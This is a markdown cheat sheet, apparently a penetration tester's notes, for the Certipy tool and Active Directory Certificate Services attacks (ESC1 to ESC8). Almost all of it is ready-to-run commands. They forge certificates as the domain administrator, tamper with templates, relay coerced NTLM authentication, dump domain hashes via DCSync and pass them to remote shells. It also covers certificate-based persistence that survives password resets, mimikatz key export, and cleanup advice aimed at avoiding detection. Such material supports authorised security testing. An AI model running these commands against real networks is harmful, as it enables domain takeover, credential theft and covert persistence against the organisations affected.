# Certipy

**Tags:** `#certipy` `#adcs` `#activedirectory` `#certificateservices` `#esc` `#privesc` `#lateralmovement` `#domainadmin`

Python tool for enumerating and exploiting Active Directory Certificate Services (AD CS) misconfigurations. Covers ESC1–ESC13 attack paths — certificate template abuse, CA misconfigurations, relay attacks, and more. AD CS vulnerabilities are extremely common in enterprise environments and often provide a direct path to Domain Admin.

**Source:** https://github.com/ly4k/Certipy
**Install:**

```bash
pip3 install certipy-ad

# Or from source
git clone https://github.com/ly4k/Certipy
cd Certipy && pip3 install .

# Verify
certipy -h
```

> [!note] The companion tool **Certify** (C# — Windows) is also commonly used. Certipy is the Linux equivalent and handles most of the same attacks. For Windows targets, Certify can be run directly on the host.

---

## Quick Reference — ESC Attacks

| ESC | Vulnerability | Requires |
|---|---|---|
| ESC1 | Enrollee supplies SAN, no manager approval | Enroll rights on template |
| ESC2 | Any purpose / SubCA template | Enroll rights on template |
| ESC3 | Certificate Request Agent template abuse | Two-step enrollment |
| ESC4 | Write access to certificate template | GenericWrite on template |
| ESC5 | PKI object ACL abuse | Write on CA/template objects |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA | Any valid enrollment |
| ESC7 | CA officer/manager rights | Manage CA / Manage Certificates rights |
| ESC8 | NTLM relay to AD CS HTTP enrollment endpoint | Network position for relay |
| ESC9 | No security extension on certificate | GenericWrite on target user |
| ESC10 | Weak certificate mapping — UserPrincipalName | GenericWrite on target user |
| ESC11 | NTLM relay to ICPR (RPC enrollment) | Network position for relay |
| ESC13 | Group-linked template issuance policy | Enroll rights on template |

---

## Enumeration

Find vulnerable templates and CAs. Always start here.

```bash
# Full AD CS enumeration — finds all vulnerable templates and CAs
certipy find -u jsmith@corp.local -p 'Password123!' -dc-ip 10.10.10.10

# Output to JSON + text (easier to read)
certipy find -u jsmith@corp.local -p 'Password123!' -dc-ip 10.10.10.10 -text -json

# Vulnerable only — filter output to only show exploitable configs
certipy find -u jsmith@corp.local -p 'Password123!' -dc-ip 10.10.10.10 -vulnerable

# With NTLM hash (pass-the-hash)
certipy find -u jsmith@corp.local -hashes ':8846f7eaee8fb117ad06bdd830b7586c' -dc-ip 10.10.10.10 -vulnerable

# From domain-joined Windows (uses current session)
certipy find -vulnerable
```

Output highlights vulnerable templates with `[!]` and shows the ESC number.

---

## ESC1 — Enrollee Supplies SAN

Most common finding. Template allows requester to specify a Subject Alternative Name (SAN) and doesn't require manager approval. Request a cert as any user including Domain Admin.

```bash
# Request certificate as domain admin
certipy req -u jsmith@corp.local -p 'Password123!' \
  -dc-ip 10.10.10.10 \
  -ca CORP-CA \
  -template VulnerableTemplate \
  -upn administrator@corp.local

# Output: administrator.pfx

# Authenticate with the certificate — get NT hash + TGT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# Output: administrator hash (NTLM) — use for PTH, secretsdump, etc.
```

---

## ESC2 — Any Purpose / SubCA Template

Template has "Any Purpose" EKU or no EKU — can be used for any authentication purpose.

```bash
# Request the any-purpose cert
certipy req -u jsmith@corp.local -p 'Password123!' \
  -dc-ip 10.10.10.10 \
  -ca CORP-CA \
  -template AnyPurposeTemplate

# Use it as a Certificate Request Agent (for ESC3 chain)
certipy req -u jsmith@corp.local -p 'Password123!' \
  -dc-ip 10.10.10.10 \
  -ca CORP-CA \
  -template User \
  -on-behalf-of corp\\administrator \
  -pfx anyPurpose.pfx
```

---

## ESC3 — Certificate Request Agent

Two-template chain: request a Certificate Request Agent cert, then use it to enroll on behalf of another user.

```bash
# Step 1 — Request a Certificate Request Agent cert
certipy req -u jsmith@corp.local -p 'Password123!' \
  -dc-ip 10.10.10.10 \
  -ca CORP-CA \
  -template CertificateRequestAgentTemplate

# Step 2 — Request cert on behalf of admin using the agent cert
certipy req -u jsmith@corp.local -p 'Password123!' \
  -dc-ip 10.10.10.10 \
  -ca CORP-CA \
  -template User \
  -on-behalf-of corp\\administrator \
  -pfx requestagent.pfx

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

---

## ESC4 — Write Access on Template

You have GenericWrite or write access on a certificate template — modify it to add ESC1 conditions, then exploit.

```bash
# Save original template config (to restore later)
certipy template -u jsmith@corp.local -p 'Password123!' \
  -dc-ip 10.10.10.10 \
  -template VulnerableTemplate \
  -save-old

# Make template vulnerable (ESC1 conditions)
certipy template -u jsmith@corp.local -p 'Password123!' \
  -dc-ip 10.10.10.10 \
  -template VulnerableTemplate \
  -configuration 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT'

# Exploit as ESC1
certipy req -u jsmith@corp.local -p 'Password123!' \
  -dc-ip 10.10.10.10 \
  -ca CORP-CA \
  -template VulnerableTemplate \
  -upn administrator@corp.local

# Restore original template config (clean up!)
certipy template -u jsmith@corp.local -p 'Password123!' \
  -dc-ip 10.10.10.10 \
  -template VulnerableTemplate \
  -configuration old_template.json
```

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

The CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set — any template enrollment allows supplying a SAN regardless of template settings.

```bash
# Request any template with a SAN override
certipy req -u jsmith@corp.local -p 'Password123!' \
  -dc-ip 10.10.10.10 \
  -ca CORP-CA \
  -template User \
  -upn administrator@corp.local

certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

---

## ESC7 — CA Officer / Manager Rights

You have Manage CA or Manage Certificates rights — approve pending requests, issue arbitrary certs.

```bash
# Step 1 — Request a cert using a restricted template (will be denied/pending)
certipy req -u jsmith@corp.local -p 'Password123!' \
  -dc-ip 10.10.10.10 \
  -ca CORP-CA \
  -template SubCA \
  -upn administrator@corp.local
# Note the Request ID from output

# Step 2 — Issue the pending request using CA manager rights
certipy ca -u jsmith@corp.local -p 'Password123!' \
  -dc-ip 10.10.10.10 \
  -ca CORP-CA \
  -issue-request <request_id>

# Step 3 — Retrieve the issued certificate
certipy req -u jsmith@corp.local -p 'Password123!' \
  -dc-ip 10.10.10.10 \
  -ca CORP-CA \
  -retrieve <request_id>

certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

---

## ESC8 — NTLM Relay to AD CS HTTP Enrollment

Relay NTLM authentication to the AD CS web enrollment endpoint (`/certsrv/`). Capture a machine account certificate, then use it for privilege escalation via S4U2Self or DCSync.

```bash
# Step 1 — Start Certipy relay listener
certipy relay -ca 10.10.10.10 -template DomainController

# Step 2 — Trigger NTLM auth from target machine (separate terminal)
# Use PetitPotam, Coercer, or Responder to coerce DC auth
python3 PetitPotam.py -u jsmith -p 'Password123!' <attacker_IP> <DC_IP>

# Output: dc01.pfx (machine account certificate)

# Authenticate with machine cert — get DC$ NT hash
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10

# Use DC$ hash for DCSync
secretsdump.py -hashes ':dc_hash' 'CORP/DC01$@10.10.10.10'
```

---

## Authentication — Using Certificates

Once you have a `.pfx` file, authenticate to get an NT hash and/or TGT.

```bash
# Auth with PFX — returns NT hash and saves TGT ccache
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# If the domain isn't auto-detected
certipy auth -pfx administrator.pfx -domain corp.local -dc-ip 10.10.10.10

# Auth as machine account
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10

# Use the NT hash for pass-the-hash
evil-winrm -i 10.10.10.10 -u administrator -H '<nt_hash>'
secretsdump.py -hashes ':<nt_hash>' administrator@10.10.10.10

# Use the TGT ccache (saved as .ccache)
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass dc01.corp.local
```

> [!note] `certipy auth` uses PKINIT (Kerberos with certificate). If PKINIT is not supported (older DCs), use **PassTheCert** or **schannel** authentication instead.

---

## Certificate Account Persistence

Certificates are valid for their full lifetime (commonly 1–3 years) even after a password reset — ideal for persistence.

```bash
# Request a user cert for long-term access
certipy req -u administrator@corp.local -p 'Password123!' \
  -dc-ip 10.10.10.10 \
  -ca CORP-CA \
  -template User

# Cert persists even after password change — authenticate anytime during validity
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

---

## Extracting Certs from Windows

```powershell
# List certificates in personal store
certutil -store my

# Export a certificate with private key (from Windows target)
# Via mimikatz
.\mimikatz.exe "crypto::certificates /store:my /export" exit

# Via Certify (C# — run on Windows)
.\Certify.exe request /ca:CORP-CA\CORP-CA /template:User
```

```bash
# Convert exported .pem to .pfx for Certipy
certipy cert -pfx output.pfx -pem cert.pem -key key.pem
```

---

## Recommended Workflow

```
1. certipy find -vulnerable → identify ESC misconfigs
2. Note CA name, template name, and ESC number
3. Exploit:
   - ESC1/ESC6 → request cert as DA, certipy auth → NT hash
   - ESC4 → modify template → ESC1 path → restore template
   - ESC7 → approve your own request → cert as DA
   - ESC8 → relay + coercion → machine cert → DCSync
4. certipy auth -pfx <file> → get NT hash + TGT
5. Use NT hash for PTH (evil-winrm, secretsdump, CME)
6. Optionally keep cert for persistent access (valid for years)
```

> [!tip] **ESC1 is the most common** finding in the wild. Always check it first. If `certipy find -vulnerable` shows any ESC1 templates where your user has Enroll rights, you have a straight path to Domain Admin in 2 commands.

> [!warning] **Clean up after ESC4** — If you modify a template, always restore the original configuration. Leaving it modified is noisy and a reportable artifact.
